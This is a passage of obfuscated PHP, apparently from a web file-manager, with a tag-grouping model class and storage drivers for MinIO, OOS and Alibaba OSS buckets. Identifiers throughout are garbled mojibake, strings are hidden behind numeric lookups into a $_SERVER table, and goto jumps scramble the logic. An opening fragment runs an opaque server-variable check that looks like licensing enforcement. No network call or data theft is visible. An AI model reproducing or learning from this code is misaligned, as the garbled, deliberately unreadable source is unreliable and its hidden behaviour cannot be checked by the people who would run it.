!isset($e≠™ØòÆØÂ[$dÖÒáÑüÛ√]) || $e≠™ØòÆØÂ[$d•»ßµóÁ][$D∂º‘ÕÏá∑[479]] == 0) { return !1; } $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[1706] => $d•»ßµóÁ); goto f°®àØıﬁ©; A¡ü´≠≤ﬁã: } } if ($_SERVER[$_SERVER[™⁄»üÆ][592]] != $_SERVER[$_SERVER[™⁄»üÆ][593]]) { goto BçªÊ¶ÁÃ⁄; EçÑö¿Ù‹∞: $F∫ÒëÁ‘©ı($_SERVER[$_SERVER[™⁄»üÆ][600]]); goto Eæ‹Û≠“‰ç; D∂ÎÎé≤˘¶: $f»ıëè…„Ÿ = explode($_SERVER[™⁄»üÆ][229], $bà≠ƒïò•§); if (count($f»ıëè…„Ÿ) < $_SERVER[™⁄»üÆ][597]) { $a∏°∑ùâºâ = $_SERVER[™⁄»üÆ][598]; $a∏°∑ùâºâ(); } $F∫ÒëÁ‘©ı = $_SERVER[™⁄»üÆ][599]; goto EçÑö¿Ù‹∞; BçªÊ¶ÁÃ⁄: $aò‡ı§∞ù∫ = $_SERVER[™⁄»üÆ][594]; $Díßÿô—ªÀ = $_SERVER[$_SERVER[™⁄»üÆ][595]] . $_SERVER[™⁄»üÆ][596]; $bà≠ƒïò•§ = $aò‡ı§∞ù∫($Díßÿô—ªÀ); goto D∂ÎÎé≤˘¶; Eæ‹Û≠“‰ç: } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Føﬁç£«™’) { $döé–ëç¨û =& $_SERVER[™⁄»üÆ]; return array($döé–ëç¨û[1811] => array($Føﬁç£«™’[0], $döé–ëç¨û[1812]), $döé–ëç¨û[1813] => array($Føﬁç£«™’[0], $döé–ëç¨û[1814])); } protected function get($EäÌú‘≠Õê) { $B¥Ì¶Ü€≠’ =& $_SERVER[™⁄»üÆ]; $Açª¿¢Ï¬´ = Model($B¥Ì¶Ü€≠’[504])->metaGet($EäÌú‘≠Õê, $B¥Ì¶Ü€≠’[1815]); $FÉÍ‡òæ£∏ = json_decode($Açª¿¢Ï¬´, !0); return $FÉÍ‡òæ£∏ ? $FÉÍ‡òæ£∏ : array($B¥Ì¶Ü€≠’[1816] => $B¥Ì¶Ü€≠’[87], $B¥Ì¶Ü€≠’[367] => array()); } protected function set($cÜÁŒ•ö“ﬂ, $DàÀú–´üÿ) { $Fêç∑ù‹ÎÂ =& $_SERVER[™⁄»üÆ]; $DàÀú–´üÿ = $DàÀú–´üÿ ? $DàÀú–´üÿ : array($Fêç∑ù‹ÎÂ[1816] => $Fêç∑ù‹ÎÂ[87], $Fêç∑ù‹ÎÂ[367] => array()); Model($Fêç∑ù‹ÎÂ[504])->metaSet($cÜÁŒ•ö“ﬂ, $Fêç∑ù‹ÎÂ[1815], json_encode($DàÀú–´üÿ)); return Model($Fêç∑ù‹ÎÂ[504])->metaSet($cÜÁŒ•ö“ﬂ, $Fêç∑ù‹ÎÂ[1815], json_encode($DàÀú–´üÿ)); } protected function getByTagID($c‡á‡“∂¢, $aÔ±¨≤çö) { goto EïˆËÑ•æ”; BÜúúÖµ˜Ç: return is_array($FºŒôßê«∫) ? $FºŒôßê«∫ : !1; goto c«úü≠¢Œ±; EïˆËÑ•æ”: $Cë´êﬂñõÀ =& $_SERVER[™⁄»üÆ]; if (!$c‡á‡“∂¢ || !$aÔ±¨≤çö) { return !1; } if (!Model($Cë´êﬂñõÀ[504])->getInfoSimple($c‡á‡“∂¢)) { return !1; } goto e∞¿È≠úÊê; e∞¿È≠úÊê: $c™í⁄‰•ãå = $this->get($c‡á‡“∂¢); if (!$c™í⁄‰•ãå || !isset($c™í⁄‰•ãå[$Cë´êﬂñõÀ[367]])) { return !1; } $FºŒôßê«∫ = array_find_by_field($c™í⁄‰•ãå[$Cë´êﬂñõÀ[367]], $Cë´êﬂñõÀ[394], $aÔ±¨≤çö); goto BÜúúÖµ˜Ç; c«úü≠¢Œ±: } public function listSource($DÕ§éôòÍ«, $E€æ¿º∆Øî) { goto DÎ„‰¢´≠≥; Dë∫ßÌ∏≠ú: foreach ($dÎç©†˘è¶ as $fßÖî∂îîì) { if (!in_array($fßÖî∂îîì, $CŒûÏœí®∂)) { $Fê¬µã∂€œ[] = $fßÖî∂îîì; } } if ($Fê¬µã∂€œ) { $this->removeBySource($DÕ§éôòÍ«, $Fê¬µã∂€œ); } return $F√ä–ﬁÎÁ‹; goto D¯áÑŒ∆ˆë; b”·˘ßπÔÚ: $F√ä–ﬁÎÁ‹ = Model($f¨´ÇòﬁàÓ[1214])->listSource($cª≤¯ÌàÔ„); if (!$F√ä–ﬁÎÁ‹ || count($dÎç©†˘è¶) == $F√ä–ﬁÎÁ‹[$f¨´ÇòﬁàÓ[364]][$f¨´ÇòﬁàÓ[365]]) { return $F√ä–ﬁÎÁ‹; } $Fê¬µã∂€œ = array(); goto fŸÇºã‹‰›; CÏ€Øæ§Ωï: foreach ($cãÛÊàö√« as $Dù«ø„‚†Ω => $Bá„ò◊‡æƒ) { $cçö§©Ì∆À = !0; if (!$E€æ¿º∆Øî) { $dÎç©†˘è¶[] = $Dù«ø„‚†Ω; continue; } foreach ($E€æ¿º∆Øî as $DñéØ•óÒ±) { if (!in_array($DñéØ•óÒ±, $Bá„ò◊‡æƒ)) { $cçö§©Ì∆À = !1; break; } } if ($cçö§©Ì∆À) { $dÎç©†˘è¶[] = $Dù«ø„‚†Ω; } } if (!$dÎç©†˘è¶) { return array(); } $cª≤¯ÌàÔ„ = array($f¨´ÇòﬁàÓ[411] => array($f¨´ÇòﬁàÓ[412], $dÎç©†˘è¶), $f¨´ÇòﬁàÓ[485] => $DÕ§éôòÍ«, $f¨´ÇòﬁàÓ[405] => SourceModel::TYPE_GROUP); goto b”·˘ßπÔÚ; fŸÇºã‹‰›: $a€Çú¯Çºé = array_to_keyvalue($F√ä–ﬁÎÁ‹[$f¨´ÇòﬁàÓ[75]], $f¨´ÇòﬁàÓ[33], $f¨´ÇòﬁàÓ[396]); $aÖµı¶π†˜ = array_to_keyvalue($F√ä–ﬁÎÁ‹[$f¨´ÇòﬁàÓ[74]], $f¨´ÇòﬁàÓ[33], $f¨´ÇòﬁàÓ[396]); $CŒûÏœí®∂ = array_merge($aÖµı¶π†˜, $a€Çú¯Çºé); goto Dë∫ßÌ∏≠ú; DÎ„‰¢´≠≥: $f¨´ÇòﬁàÓ =& $_SERVER[™⁄»üÆ]; if ($E€æ¿º∆Øî && !is_array($E€æ¿º∆Øî)) { $E€æ¿º∆Øî = array($E€æ¿º∆Øî); } $Dˆ‰–ƒÕœÂ = $this->listData($DÕ§éôòÍ«); goto b›åËåäÌ¨; b›åËåäÌ¨: $cãÛÊàö√« = array(); foreach ($Dˆ‰–ƒÕœÂ as $F°öç“≠Œ‘) { $fßÖî∂îîì = $F°öç“≠Œ‘[$f¨´ÇòﬁàÓ[76]]; if (!$fßÖî∂îîì) { continue; } if (!isset($cãÛÊàö√«[$fßÖî∂îîì])) { $cãÛÊàö√«[$fßÖî∂îîì] = array(); } $cãÛÊàö√«[$fßÖî∂îîì][] = $F°öç“≠Œ‘[$f¨´ÇòﬁàÓ[420]]; } $dÎç©†˘è¶ = array(); goto CÏ€Øæ§Ωï; D¯áÑŒ∆ˆë: } protected function listData($D‰Ù≈ª‰Ï¿) { $b˜¯£Œ¿ùé =& $_SERVER[™⁄»üÆ]; $d√©ôÙü›‡ = array($b˜¯£Œ¿ùé[1528] => 0, $b˜¯£Œ¿ùé[464] => array($b˜¯£Œ¿ùé[1817], 0), $b˜¯£Œ¿ùé[416] => $b˜¯£Œ¿ùé[1818] . $D‰Ù≈ª‰Ï¿); $c‡û¨≠Îâƒ = $b˜¯£Œ¿ùé[1819]; $A¥â∏’È¨© = $this->field($c‡û¨≠Îâƒ)->where($d√©ôÙü›‡)->order($b˜¯£Œ¿ùé[1820])->select(); return $A¥â∏’È¨© ? $A¥â∏’È¨© : array(); } protected function addToTag($f’‰ÑâìŒø, $d˘ßÜ·Ñ≥ß, $a÷ê´ÉƒÈü) { $F“åœÏ≈¨Ÿ =& $_SERVER[™⁄»üÆ]; if (!$this->getByTagID($f’‰ÑâìŒø, $a÷ê´ÉƒÈü) || !$d˘ßÜ·Ñ≥ß) { return !1; } if (!Model($F“åœÏ≈¨Ÿ[809])->pathInfo($d˘ßÜ·Ñ≥ß)) { return !1; } $câæôô ú· = array($F“åœÏ≈¨Ÿ[1528] => 0, $F“åœÏ≈¨Ÿ[464] => $a÷ê´ÉƒÈü, $F“åœÏ≈¨Ÿ[415] => $d˘ßÜ·Ñ≥ß, $F“åœÏ≈¨Ÿ[416] => $F“åœÏ≈¨Ÿ[1821] . $f’‰ÑâìŒø, $F“åœÏ≈¨Ÿ[414] => $F“åœÏ≈¨Ÿ[33], $F“åœÏ≈¨Ÿ[1710] => 0); if ($this->where($câæôô ú·)->find()) { return !1; } return $this->add($câæôô ú·); } protected function removeFromTag($b•£¿Ò◊å‘, $Dû∞‚Ñô∂∫, $fé¢ÖØ∂Óø) { $Dã⁄ê‘ï∂≤ =& $_SERVER[™⁄»üÆ]; if (!$this->getByTagID($b•£¿Ò◊å‘, $fé¢ÖØ∂Óø) || !$Dû∞‚Ñô∂∫) { return !1; } if (is_array($Dû∞‚Ñô∂∫)) { $Dû∞‚Ñô∂∫ = array($Dã⁄ê‘ï∂≤[7], $Dû∞‚Ñô∂∫); } $b–ô‡ûÔ„É = array($Dã⁄ê‘ï∂≤[1528] => 0, $Dã⁄ê‘ï∂≤[464] => $fé¢ÖØ∂Óø, $Dã⁄ê‘ï∂≤[416] => $Dã⁄ê‘ï∂≤[1821] . $b•£¿Ò◊å‘, $Dã⁄ê‘ï∂≤[415] => $Dû∞‚Ñô∂∫); return $this->where($b–ô‡ûÔ„É)->delete(); } protected function removeByTag($b©øª…«ßÛ, $C—éÏŸÚçà) { $Cº®€úÇ·“ =& $_SERVER[™⁄»üÆ]; if (!$this->getByTagID($b©øª…«ßÛ, $C—éÏŸÚçà)) { return !1; } $DÏôÔÙ∏ı÷ = array($Cº®€úÇ·“[1528] => 0, $Cº®€úÇ·“[464] => $C—éÏŸÚçà, $Cº®€úÇ·“[416] => $Cº®€úÇ·“[1821] . $b©øª…«ßÛ); return $this->where($DÏôÔÙ∏ı÷)->delete(); } protected function removeBySource($bÍÜ¿ÖÎèÒ, $c⁄íı®èÃ·) { $EçíŸø≤÷› =& $_SERVER[™⁄»üÆ]; if (!$bÍÜ¿ÖÎèÒ || !$c⁄íı®èÃ·) { return !1; } if (is_array($c⁄íı®èÃ·)) { $c⁄íı®èÃ· = array($EçíŸø≤÷›[7], $c⁄íı®èÃ·); } $a‰–Ïƒ™ﬁÉ = array($EçíŸø≤÷›[1528] => 0, $EçíŸø≤÷›[415] => $c⁄íı®èÃ·, $EçíŸø≤÷›[464] => array($EçíŸø≤÷›[981], 0), $EçíŸø≤÷›[416] => $EçíŸø≤÷›[1821] . $bÍÜ¿ÖÎèÒ); return $this->where($a‰–Ïƒ™ﬁÉ)->delete(); } } goto c≤„ïÍ∑÷†; CÙÔ÷›õ“©: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($f∫≠Ñ¯ÕÆ°) { parent::__construct($f∫≠Ñ¯ÕÆ°); $this->signatureVersion($_SERVER[™⁄»üÆ][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($F©ºÖ–µä∏) { parent::__construct($F©ºÖ–µä∏); $this->signatureVersion($_SERVER[™⁄»üÆ][212]); } public function fileOutLink($Bê·Âœ¢ß‚) { $bõËŸâßΩí =& $_SERVER[™⁄»üÆ]; if (substr($Bê·Âœ¢ß‚, 0, 7) == $bõËŸâßΩí[1212]) { $Bê·Âœ¢ß‚ = $bõËŸâßΩí[1213] . substr($Bê·Âœ¢ß‚, 7); } header($bõËŸâßΩí[159] . $Bê·Âœ¢ß‚); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($D»‘¨Ωπî) { parent::__construct(); include_once SDK_DIR . $_SERVER[™⁄»üÆ][1268]; $this->_init($D»‘¨Ωπî); } public function _init($FÁ•∏ûÿ€É) { $F√¡íŸ«« =& $_SERVER[™⁄»üÆ]; foreach ($FÁ•∏ûÿ€É as $B——ÃÜé÷ø => $Eíîç„ƒÒ∆) { if (isset($this->{$B——ÃÜé÷ø})) { $this->{$B——ÃÜé÷ø} = $Eíîç„ƒÒ∆; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($F√¡íŸ««[1269] . LNG($F√¡íŸ««[1270])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto dÂêÛó›œ; FÑÚ©æ¢Ñﬂ: $FÃÖ¡ä≤éÕ->addAllowedMethod($C‡∏ïñ´¿Ñ[1274]); $FÃÖ¡ä≤éÕ->addAllowedMethod($C‡∏ïñ´¿Ñ[1275]); $FÃÖ¡ä≤éÕ->addAllowedMethod($C‡∏ïñ´¿Ñ[158]); goto cûéé‚£≠É; DŒ·ªåÌüë: $côÆ≈˘”£Ï->addRule($FÃÖ¡ä≤éÕ); try { $this->client->putBucketCors($this->bucket, $côÆ≈˘”£Ï); } catch (OSS\Core\OssException $D£≤Û≠ëÁ°) { return !1; } return !0; goto C≈£ëäÉ‚Ú; D≥»∞·öú“: $FÃÖ¡ä≤éÕ->addAllowedOrigin($C‡∏ïñ´¿Ñ[1271]); $FÃÖ¡ä≤éÕ->addAllowedMethod($C‡∏ïñ´¿Ñ[1272]); $FÃÖ¡ä≤éÕ->addAllowedMethod($C‡∏ïñ´¿Ñ[1273]); goto FÑÚ©æ¢Ñﬂ; dÂêÛó›œ: $C‡∏ïñ´¿Ñ =& $_SERVER[™⁄»üÆ]; $côÆ≈˘”£Ï = new OSS\Model\CorsConfig(); $FÃÖ¡ä≤éÕ = new OSS\Model\CorsRule(); goto D≥»∞·öú“; cûéé‚£≠É: $FÃÖ¡ä≤éÕ->setMaxAgeSeconds(600); $FÃÖ¡ä≤éÕ->addExposeHeader($C‡∏ïñ´¿Ñ[1276]); $FÃÖ¡ä≤éÕ->addAllowedHeader($C‡∏ïñ´¿Ñ[1271]); goto DŒ·ªåÌüë; C≈£ëäÉ‚Ú: } public function getBucketCors() { goto fÆ‘åä§‹œ; fà´µé›∑ß: if (!$f†í“êçî∆ || !($EÒ£ºÜäÇæ = $f†í“êçî∆->getRules())) { return null; } $fáµ–®¶¶Ì = $EÒ£ºÜäÇæ[0]->getAllowedOrigins(); $DØºŸ‡™Œ¿ = $EÒ£ºÜäÇæ[0]->getAllowedMethods(); goto CÇÔ®ã€éè; bêÕÿô∆€â: return array($cÉ§ô†à‘¨[181] => isset($fáµ–®¶¶Ì[0]) ? $fáµ–®¶¶Ì[0] : $cÉ§ô†à‘¨[33], $cÉ§ô†à‘¨[185] => $DØºŸ‡™Œ¿, $cÉ§ô†à‘¨[1277] => $EﬂÇ»˜‰≠…, $cÉ§ô†à‘¨[1278] => isset($E›Ô»©¡õ”[0]) ? $E›Ô»©¡õ”[0] : $cÉ§ô†à‘¨[33], $cÉ§ô†à‘¨[183] => isset($aá∂Õﬂàø—[0]) ? $aá∂Õﬂàø—[0] : $cÉ§ô†à‘¨[33]); goto d–Øç€ßè™; fÆ‘åä§‹œ: $cÉ§ô†à‘¨ =& $_SERVER[™⁄»üÆ]; $f†í“êçî∆ = null; try { $f†í“êçî∆ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $AÜÖë∂¿¬˘) { return null; } goto fà´µé›∑ß; CÇÔ®ã€éè: $EﬂÇ»˜‰≠… = $EÒ£ºÜäÇæ[0]->getMaxAgeSeconds(); $E›Ô»©¡õ” = $EÒ£ºÜäÇæ[0]->getExposeHeaders(); $aá∂Õﬂàø— = $EÒ£ºÜäÇæ[0]->getAllowedHeaders(); goto bêÕÿô∆€â; d–Øç€ßè™: } public function isBucketCors() { goto AÀ±ŒøÓªö; eî…•îÚÁŸ: if ($cù£ƒÃﬁáı[$dß¿£òªÚƒ[181]] != $dß¿£òªÚƒ[182] || $cù£ƒÃﬁáı[$dß¿£òªÚƒ[183]] != $dß¿£òªÚƒ[182]) { return !1; } $eõô±¢ÍÀ≥ = array_map($dß¿£òªÚƒ[184], $cù£ƒÃﬁáı[$dß¿£òªÚƒ[185]]); if (!is_array($eõô±¢ÍÀ≥)) { $eõô±¢ÍÀ≥ = array(); } goto DçÃ∑∆πªï; AÀ±ŒøÓªö: $dß¿£òªÚƒ =& $_SERVER[™⁄»üÆ]; $cù£ƒÃﬁáı = $this->getBucketCors(); if (!$cù£ƒÃﬁáı || !is_array($cù£ƒÃﬁáı)) { return !1; } goto eî…•îÚÁŸ; DçÃ∑∆πªï: $F‡óÜÿ‹ûÖ = array($dß¿£òªÚƒ[186], $dß¿£òªÚƒ[187], $dß¿£òªÚƒ[188], $dß¿£òªÚƒ[189], $dß¿£òªÚƒ[190]); $FÕ∏ÃÊåòÈ = array_diff($F‡óÜÿ‹ûÖ, $eõô±¢ÍÀ≥); return empty($FÕ∏ÃÊåòÈ); goto eŒ¨¬Ï∏Õ€; eŒ¨¬Ï∏Õ€: } public function mkfile($füœ…Ü£áá, $a¿‘¢ª„ÿ∏ = '', $e¢˘«öì‚Ÿ = REPEAT_RENAME) { $eÏ’Ÿ∑∏¢— = $this->setContent($füœ…Ü£áá, $a¿‘¢ª„ÿ∏); if ($eÏ’Ÿ∑∏¢— !== !1) { return $this->getPathOuter($füœ…Ü£áá); } return !1; } public function mkdir($Fòœ∫ïÛìó, $Eœ¡†á£π = REPEAT_SKIP) { if ($this->_isFolder($Fòœ∫ïÛìó)) { return $this->getPathOuter($Fòœ∫ïÛìó); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Fòœ∫ïÛìó)); } catch (OSS\Core\OssException $Aè≠£†…“¬) { return !1; } return $this->getPathOuter($Fòœ∫ïÛìó); } private function fileList($EËıÖ Ììö, $A Ïîáá«ú = '', $BÔæÕÈàÍ© = 0) { goto DÆ⁄ÃÉÖ¢ÿ; A∫ºõ∆Úèà: return array($càÀÿàÓÓ¿[75] => $CÇ–∂¬“éÖ, $càÀÿàÓÓ¿[74] => $AÑÑ¶‹™Øî); goto A∏Œ¯⁄ò…; e”ìïµÊÆ˘: $dŒç–œ«Òı = $càÀÿàÓÓ¿[33]; $C †«ö÷æÖ = 1000; $f≤∂Ωª„ïœ = $this->listItemCache === !1 ? !1 : !0; goto f⁄è’Òæèﬁ; f⁄è’Òæèﬁ: $CÇ–∂¬“éÖ = $AÑÑ¶‹™Øî = array(); while (!0) { check_abort(); $DªÉÉáá⁄é = array($càÀÿàÓÓ¿[1279] => $A Ïîáá«ú, $càÀÿàÓÓ¿[1280] => $E≥ı†€»´·, $càÀÿàÓÓ¿[1281] => $C †«ö÷æÖ, $càÀÿàÓÓ¿[1282] => $dŒç–œ«Òı); try { $aÈ¶πÇ…æÍ = $this->client->listObjects($this->bucket, $DªÉÉáá⁄é); } catch (OSS\Core\OssException $d›•éÊ≤ëö) { break; } $dŒç–œ«Òı = $aÈ¶πÇ…æÍ->getNextMarker(); $b¨åë¯Éº… = $aÈ¶πÇ…æÍ->getObjectList(); $fŒîÏøµÃ” = $aÈ¶πÇ…æÍ->getPrefixList(); foreach ($b¨åë¯Éº… as $aüù™¨‹˘™) { goto c‰–ù¬Èà≤; c‰–ù¬Èà≤: if ($aüù™¨‹˘™->getKey() == $E≥ı†€»´·) { continue; } $EÁ–∫ŸÁ∑¿ = $aüù™¨‹˘™->getKey(); $d™÷´íÔπ– = $aüù™¨‹˘™->getSize(); goto EÊå‡à¶∞Í; EÊå‡à¶∞Í: $E√˘öÕ‹À… = $aüù™¨‹˘™->getLastModified(); $F‰›Óıâèß = $BÔæÕÈàÍ© ? array($càÀÿàÓÓ¿[28] => $EÁ–∫ŸÁ∑¿, $càÀÿàÓÓ¿[78] => $d™÷´íÔπ–, $càÀÿàÓÓ¿[197] => strtotime($E√˘öÕ‹À…)) : $EÁ–∫ŸÁ∑¿; $B„˘êì´Âõ = $d™÷´íÔπ– == 0 && substr($EÁ–∫ŸÁ∑¿, strlen($EÁ–∫ŸÁ∑¿) - 1, 1) == $càÀÿàÓÓ¿[8] ? !0 : !1; goto AÇ’‚Øâ»ë; AÇ’‚Øâ»ë: if ($f≤∂Ωª„ïœ) { $this->cacheMethod($càÀÿàÓÓ¿[199], $EÁ–∫ŸÁ∑¿, $B„˘êì´Âõ); $this->cacheMethod($càÀÿàÓÓ¿[200], $EÁ–∫ŸÁ∑¿, array($càÀÿàÓÓ¿[78] => $d™÷´íÔπ–, $càÀÿàÓÓ¿[1283] => $d™÷´íÔπ–, $càÀÿàÓÓ¿[84] => strtotime($E√˘öÕ‹À…), $càÀÿàÓÓ¿[1284] => $E√˘öÕ‹À…)); } if ($B„˘êì´Âõ) { $CÇ–∂¬“éÖ[] = $EÁ–∫ŸÁ∑¿; continue; } $AÑÑ¶‹™Øî[] = $F‰›Óıâèß; goto dÕ·öŸ‰≥ì; dÕ·öŸ‰≥ì: } foreach ($fŒîÏøµÃ” as $CëΩﬂÙâ∏Ñ) { $CÇ–∂¬“éÖ[] = $CëΩﬂÙâ∏Ñ->getPrefix(); if ($f≤∂Ωª„ïœ) { $this->cacheMethod($càÀÿàÓÓ¿[199], $EÁ–∫ŸÁ∑¿, !0); } } if ($dŒç–œ«Òı === $càÀÿàÓÓ¿[33]) { break; } } if ($f≤∂Ωª„ïœ) { $this->cacheMethod($càÀÿàÓÓ¿[199], $EËıÖ Ììö, !0); } goto A∫ºõ∆Úèà; DÆ⁄ÃÉÖ¢ÿ: $càÀÿàÓÓ¿ =& $_SERVER[™⁄»üÆ]; $EËıÖ Ììö = trim($EËıÖ Ììö, $càÀÿàÓÓ¿[8]); $E≥ı†€»´· = empty($EËıÖ Ììö) && $EËıÖ Ììö !== $càÀÿàÓÓ¿[191] ? $càÀÿàÓÓ¿[33] : $EËıÖ Ììö . $càÀÿàÓÓ¿[8]; goto e”ìïµÊÆ˘; A∏Œ¯⁄ò…: } public function copyFile($CÿŸëëäÒ¥, $cÖƒª⁄éÆ∏) { $AÉíÜíéÒö = $this->size($CÿŸëëäÒ¥); if ($AÉíÜíéÒö < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CÿŸëëäÒ¥, $this->bucket, $this->pathEncode($cÖƒª⁄éÆ∏)); } catch (OSS\Core\OssException $Aßô◊ç¥ëÈ) { return !1; } return $this->getPathOuter($cÖƒª⁄éÆ∏); } $C•éÂ¡ÿ¬Ó = $this->multiCopyObject($CÿŸëëäÒ¥, $cÖƒª⁄éÆ∏, $AÉíÜíéÒö); return $C•éÂ¡ÿ¬Ó ? $this->getPathOuter($cÖƒª⁄éÆ∏) : !1; } private function multiCopyObject($Fº•∫ëä È, $bÖ¶ƒŒô»¨, $dü∫·∆ó∑ö) { $a‡º»Ωïà¬ =& $_SERVER[™⁄»üÆ]; try { goto eÑÇ‰‡Ûç‚; EÖ¶“ªÂËí: $bº≠Ó®ÜÀ« = array(); foreach ($fê§™∞¡ë‚ as $fÌ´áÒïÛÇ => $AÔ´ ≥ûı‘) { $bº≠Ó®ÜÀ«[] = array($a‡º»Ωïà¬[1289] => $fÌ´áÒïÛÇ + 1, $a‡º»Ωïà¬[1290] => $AÔ´ ≥ûı‘); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bÖ¶ƒŒô»¨), $dÿ¢‰ÚŸàÑ, $bº≠Ó®ÜÀ«); goto bÔÿ¬£è∞; cÉ§“®π∑Ï: $cœÏ≤” ™ø = 1024 * 1024 * 10; $e´¡»ªΩ…Õ = $this->client->generateMultiuploadParts($dü∫·∆ó∑ö, $cœÏ≤” ™ø); foreach ($e´¡»ªΩ…Õ as $fÌ´áÒïÛÇ => $AÆ¥£Íõîó) { $D»Ô©Î Üø = $fë·‚ÚÜ∞û + (int) $AÆ¥£Íõîó[$a‡º»Ωïà¬[1286]]; $FÜÕâƒÁ˘£ = (int) $AÆ¥£Íõîó[$a‡º»Ωïà¬[335]] + $D»Ô©Î Üø - 1; $BŸ´µ∫”àﬁ = array($a‡º»Ωïà¬[1287] => $D»Ô©Î Üø, $a‡º»Ωïà¬[1288] => $FÜÕâƒÁ˘£); $fê§™∞¡ë‚[] = $this->client->uploadPartCopy($this->bucket, $Fº•∫ëä È, $this->bucket, $this->pathEncode($bÖ¶ƒŒô»¨), $Få•âÉ◊êÉ, $dÿ¢‰ÚŸàÑ, $BŸ´µ∫”àﬁ); $Få•âÉ◊êÉ = $Få•âÉ◊êÉ + 1; } goto EÖ¶“ªÂËí; eÑÇ‰‡Ûç‚: $d¢´áôº≥® = array(); if ($A¬ÜÉÙ•Ã∏ = $this->hashMd5($Fº•∫ëä È)) { $d¢´áôº≥® = array(OSS\OssClient::OSS_HEADERS => array($a‡º»Ωïà¬[1285] => $A¬ÜÉÙ•Ã∏)); } $dÿ¢‰ÚŸàÑ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÖ¶ƒŒô»¨), $d¢´áôº≥®); goto Cß•§‡ﬂúæ; Cß•§‡ﬂúæ: $Få•âÉ◊êÉ = 1; $fë·‚ÚÜ∞û = 0; $fê§™∞¡ë‚ = array(); goto cÉ§“®π∑Ï; bÔÿ¬£è∞: } catch (OSS\Core\OssException $A≤¢€«Ÿè°) { return !1; } return !0; } public function moveFile($cΩÓ„öˆÚø, $F‚ˆπ∏Óú©) { if ($this->copyFile($cΩÓ„öˆÚø, $F‚ˆπ∏Óú©)) { $this->remove($cΩÓ„öˆÚø); return $this->getPathOuter($F‚ˆπ∏Óú©); } return !1; } public function delFile($béÖ÷õ‹Ò©) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($béÖ÷õ‹Ò©)); } catch (OSS\Core\OssException $F º Õ¢å¬) { return !1; } return !0; } public function delFolder($dµèàÈäœı) { goto eÕÓ™ê£É÷; dãä–áï∏¯: $Aáç˜è≤Èú = $this->fileList($dµèàÈäœı); $this->listItemCache = !0; $a€”ë«»¨õ = trim($dµèàÈäœı, $EäËØ’´Ãõ[8]) . $EäËØ’´Ãõ[8]; goto c¶åÈ•´–Ô; bŒ…Ò€◊ëŒ: $Dìª‚õÔìË = $this->delByBatch($Aáç˜è≤Èú[$EäËØ’´Ãõ[75]]); if (!$Dìª‚õÔìË) { return !1; } return $this->delFile($a€”ë«»¨õ); goto B∆Ò€ÇÊ‚Á; eÕÓ™ê£É÷: $EäËØ’´Ãõ =& $_SERVER[™⁄»üÆ]; if (!$this->exist($dµèàÈäœı)) { return !0; } $this->listItemCache = !1; goto dãä–áï∏¯; c¶åÈ•´–Ô: if (!empty($dµèàÈäœı) && $dµèàÈäœı !== $EäËØ’´Ãõ[191] && !in_array($a€”ë«»¨õ, $Aáç˜è≤Èú[$EäËØ’´Ãõ[75]])) { $Aáç˜è≤Èú[$EäËØ’´Ãõ[75]][] = $a€”ë«»¨õ; } $Dìª‚õÔìË = $this->delByBatch($Aáç˜è≤Èú[$EäËØ’´Ãõ[74]]); if (!$Dìª‚õÔìË) { return !1; } goto bŒ…Ò€◊ëŒ; B∆Ò€ÇÊ‚Á: } private function delByBatch($CäöÂÿ∆òé) { foreach (array_chunk($CäöÂÿ∆òé, 1000) as $eÖùÆ…É÷Õ) { try { $this->client->deleteObjects($this->bucket, $eÖùÆ…É÷Õ); } catch (OSS\Core\OssException $b£ëÓá‰Ú†) { return !1; } } return !0; } public function rename($BØçÒˆºÛ·, $Cº∫î«œÇÙ) { return $this->renameObject($BØçÒˆºÛ·, $Cº∫î«œÇÙ); } private function fileInfo($c±ûÑ©‹÷ß, $Fºàä´›ÿñ = false, $dîß∆©èÏã = array()) { goto D–Ú™˘Ñœ·; A÷…Ò‘•“ä: $b´Øîª˘Öπ[$F∂èàß¯†“[194]] = $b´Øîª˘Öπ[$F∂èàß¯†“[84]] = 0; $b´Øîª˘Öπ[$F∂èàß¯†“[195]] = $b´Øîª˘Öπ[$F∂èàß¯†“[196]] = !0; if (empty($dîß∆©èÏã)) { $a◊ÀÀ†ÓØ≤ = $this->objectMeta($c±ûÑ©‹÷ß); if (!$a◊ÀÀ†ÓØ≤) { return $b´Øîª˘Öπ; } $dîß∆©èÏã = array($F∂èàß¯†“[84] => strtotime($a◊ÀÀ†ÓØ≤[$F∂èàß¯†“[1284]]), $F∂èàß¯†“[78] => $a◊ÀÀ†ÓØ≤[$F∂èàß¯†“[1283]] + 0); } goto d´Ë±éÎﬁâ; D–Ú™˘Ñœ·: $F∂èàß¯†“ =& $_SERVER[™⁄»üÆ]; $b´Øîª˘Öπ = array($F∂èàß¯†“[28] => $this->pathThis($c±ûÑ©‹÷ß), $F∂èàß¯†“[76] => $this->getPathOuter($c±ûÑ©‹÷ß), $F∂èàß¯†“[29] => $F∂èàß¯†“[193], $F∂èàß¯†“[78] => isset($dîß∆©èÏã[$F∂èàß¯†“[78]]) ? $dîß∆©èÏã[$F∂èàß¯†“[78]] : 0, $F∂èàß¯†“[168] => $this->ext($c±ûÑ©‹÷ß)); if ($Fºàä´›ÿñ) { return $b´Øîª˘Öπ; } goto A÷…Ò‘•“ä; D«‹∆ïΩÃá: return $b´Øîª˘Öπ; goto eÃÂõ®âôè; d´Ë±éÎﬁâ: if (isset($dîß∆©èÏã[$F∂èàß¯†“[78]])) { 